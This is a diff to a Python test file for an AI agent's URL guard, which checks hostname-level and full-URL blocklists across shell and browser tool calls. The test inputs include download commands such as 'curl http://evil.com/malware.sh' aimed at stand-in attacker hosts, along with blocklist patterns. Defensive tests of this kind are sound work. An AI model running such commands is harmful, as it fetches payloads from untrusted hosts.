@@ -31,6 +31,7 @@ def mock_url_guard_config():
     """Mock config with empty URL guard settings."""
     url_guard_cfg = MagicMock()
     url_guard_cfg.enabled = True
+    url_guard_cfg.blocked_hostnames = []
     url_guard_cfg.blocked_urls = []
     url_guard_cfg.allowed_urls = []
     url_guard_cfg.blocked_ip_ranges = []
@@ -206,9 +207,10 @@ class TestUrlGuardianBasic:
 
 
 class TestBlocklist:
-    """Blocklist matching tests."""
+    """Blocklist matching tests (hostname-level vs full-URL-level)."""
 
-    def test_exact_blocklist_match(self, mock_url_guard_config):
+    def test_exact_url_blocklist_match(self, mock_url_guard_config):
+        # Full-URL-level pattern matches the entire URL.
         g = UrlGuardian(
             enabled=True,
             blocked_urls=["http://evil.com/malware.sh"],
@@ -218,24 +220,72 @@ class TestBlocklist:
             {"command": "curl http://evil.com/malware.sh"},
         )
         assert len(findings) == 1
-        assert findings[0].rule_id == "URL_BLOCKLIST"
+        assert findings[0].rule_id == "URL_BLOCKLIST_URL"
 
-    def test_glob_pattern_match(self, mock_url_guard_config):
+    def test_glob_url_pattern_match(self, mock_url_guard_config):
+        # A glob on the full URL still matches the URL endpoint.
         g = UrlGuardian(enabled=True, blocked_urls=["*evil.com*"])
         findings = g.guard(
             "execute_shell_command",
             {"command": "curl http://evil.com/anything"},
         )
         assert len(findings) == 1
-        assert findings[0].rule_id == "URL_BLOCKLIST"
+        assert findings[0].rule_id == "URL_BLOCKLIST_URL"
 
-    def test_domain_wildcard(self, mock_url_guard_config):
-        g = UrlGuardian(enabled=True, blocked_urls=["*.evil.com"])
+    def test_hostname_blocklist_match(self, mock_url_guard_config):
+        # Hostname-level pattern matches the hostname (whole domain).
+        g = UrlGuardian(
+            enabled=True,
+            blocked_hostnames=["*.evil.com"],
+        )
         findings = g.guard(
             "execute_shell_command",
             {"command": "wget https://sub.evil.com/payload"},
         )
         assert len(findings) == 1
+        assert findings[0].rule_id == "URL_BLOCKLIST_HOST"
+
+    def test_hostname_blocklist_subdomain(self, mock_url_guard_config):
+        # A hostname pattern blocks every subdomain of the blocked domain.
+        g = UrlGuardian(
+            enabled=True,
+            blocked_hostnames=["*csdn.net*"],
+        )
+        findings = g.guard(
+            "execute_shell_command",
+            {"command": "curl https://blog.csdn.net/article"},
+        )
+        assert len(findings) == 1
+        assert findings[0].rule_id == "URL_BLOCKLIST_HOST"
+
+    def test_hostname_pattern_does_not_match_url_path(self, mock_url_guard_config):
+        # A hostname pattern must NOT match a full-URL glob that only the
+        # URL-level list should catch.
+        g = UrlGuardian(
+            enabled=True,
+            blocked_hostnames=["*.evil.com"],
+        )
+        findings = g.guard(
+            "execute_shell_command",
+            {"command": "wget https://sub.evil.com/payload"},
+        )
+        assert findings[0].rule_id == "URL_BLOCKLIST_HOST"
+
+    def test_both_blocklists_validated(self, mock_url_guard_config):
+        # A URL matching BOTH a hostname and a full-URL pattern yields
+        # two findings (both interception methods run).
+        g = UrlGuardian(
+            enabled=True,
+            blocked_hostnames=["*evil.com*"],
+            blocked_urls=["http://evil.com/malware.sh"],
+        )
+        findings = g.guard(
+            "execute_shell_command",
+            {"command": "curl http://evil.com/malware.sh"},
+        )
+        rule_ids = {f.rule_id for f in findings}
+        assert "URL_BLOCKLIST_HOST" in rule_ids
+        assert "URL_BLOCKLIST_URL" in rule_ids
 
     def test_non_matching_url(self, mock_url_guard_config):
         g = UrlGuardian(enabled=True, blocked_urls=["*evil.com*"])
@@ -244,11 +294,16 @@ class TestBlocklist:
             {"command": "curl https://github.com/repo"},
         )
         # Should only have built-in checks, not blocklist
-        blocklist_findings = [f for f in findings if f.rule_id == "URL_BLOCKLIST"]
+        blocklist_findings = [
+            f for f in findings
+            if f.rule_id in ("URL_BLOCKLIST_HOST", "URL_BLOCKLIST_URL")
+        ]
         assert len(blocklist_findings) == 0
 
     def test_finding_has_correct_fields(self, mock_url_guard_config):
-        g = UrlGuardian(enabled=True, blocked_urls=["*evil.com*"])
+        g = UrlGuardian(
+            enabled=True, blocked_urls=["http://evil.com/malware.sh"],
+        )
         findings = g.guard(
             "execute_shell_command",
             {"command": "curl http://evil.com/malware.sh"},
@@ -274,7 +329,10 @@ class TestAllowlist:
             {"command": "curl http://evil.com/test"},
         )
         # Allowlist should let it through, but built-in checks still run
-        block_findings = [f for f in findings if f.rule_id == "URL_BLOCKLIST"]
+        block_findings = [
+            f for f in findings
+            if f.rule_id in ("URL_BLOCKLIST_HOST", "URL_BLOCKLIST_URL")
+        ]
         assert len(block_findings) == 0
 
     def test_allowlist_does_not_affect_other_checks(self, mock_url_guard_config):
@@ -305,7 +363,10 @@ class TestAllowlist:
             "execute_shell_command",
             {"command": "curl http://evil.com/whitelist/api"},
         )
-        block_findings = [f for f in findings if f.rule_id == "URL_BLOCKLIST"]
+        block_findings = [
+            f for f in findings
+            if f.rule_id in ("URL_BLOCKLIST_HOST", "URL_BLOCKLIST_URL")
+        ]
         assert len(block_findings) == 0
 
 
@@ -402,7 +463,10 @@ class TestSeverityLevels:
             "execute_shell_command",
             {"command": "curl http://evil.com/test"},
         )
-        f = next(ff for ff in findings if ff.rule_id == "URL_BLOCKLIST")
+        f = next(
+            ff for ff in findings
+            if ff.rule_id in ("URL_BLOCKLIST_HOST", "URL_BLOCKLIST_URL")
+        )
         assert f.severity.value == "HIGH"
 
     def test_suspicious_tld_is_medium(self, url_guardian):
@@ -447,6 +511,73 @@ class TestNonShellTools:
             {"file_path": "/tmp/safe.txt", "content": "hello"},
         )
         assert len(findings) == 0
+
+
+class TestBrowserUse:
+    """browser_use URL scanning (url / cdp_url / actions_json)."""
+
+    def test_browser_open_url_hostname_blocked(self, mock_url_guard_config):
+        g = UrlGuardian(
+            enabled=True,
+            blocked_hostnames=["*csdn.net*"],
+        )
+        findings = g.guard(
+            "browser_use",
+            {"action": "open", "url": "https://www.csdn.net/article"},
+        )
+        assert any(f.rule_id == "URL_BLOCKLIST_HOST" for f in findings)
+
+    def test_browser_open_url_endpoint_blocked(self, mock_url_guard_config):
+        g = UrlGuardian(
+            enabled=True,
+            blocked_urls=["https://csdn.net/article/123*"],
+        )
+        findings = g.guard(
+            "browser_use",
+            {"action": "open", "url": "https://csdn.net/article/123"},
+        )
+        assert any(f.rule_id == "URL_BLOCKLIST_URL" for f in findings)
+
+    def test_browser_cdp_url_blocked(self, mock_url_guard_config):
+        g = UrlGuardian(
+            enabled=True,
+            blocked_hostnames=["*evil.com*"],
+        )
+        findings = g.guard(
+            "browser_use",
+            {"action": "connect_cdp", "cdp_url": "http://browser.evil.com:9222"},
+        )
+        assert any(f.rule_id == "URL_BLOCKLIST_HOST" for f in findings)
+
+    def test_browser_actions_json_blocked(self, mock_url_guard_config):
+        g = UrlGuardian(
+            enabled=True,
+            blocked_hostnames=["*csdn.net*"],
+        )
+        actions = {
+            "actions": [
+                {"type": "goto", "url": "https://blog.csdn.net/x"},
+            ]
+        }
+        findings = g.guard(
+            "browser_use",
+            {"action": "batch", "actions_json": actions},
+        )
+        assert any(f.rule_id == "URL_BLOCKLIST_HOST" for f in findings)
+
+    def test_browser_safe_url_passes(self, mock_url_guard_config):
+        g = UrlGuardian(
+            enabled=True,
+            blocked_hostnames=["*csdn.net*"],
+        )
+        findings = g.guard(
+            "browser_use",
+            {"action": "open", "url": "https://example.com/page"},
+        )
+        assert not any(
+            f.rule_id in ("URL_BLOCKLIST_HOST", "URL_BLOCKLIST_URL")
+            for f in findings
+        )
 
 
 class TestEdgeCases:
